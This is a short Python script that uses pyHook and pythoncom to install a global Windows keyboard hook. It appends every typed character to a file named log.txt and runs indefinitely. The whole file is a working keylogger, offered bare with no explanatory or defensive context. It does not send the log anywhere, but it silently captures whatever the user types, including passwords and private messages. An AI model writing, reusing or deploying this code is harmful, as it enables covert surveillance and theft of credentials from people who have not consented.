import pyHook, pythoncom


def OnKeyboardEvent(event):
    File = open('log.txt','a')
    File.write(chr(event.Ascii))
    File.close()
    return True

hooks_manager = pyHook.HookManager ( )
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard ( )
pythoncom.PumpMessages ()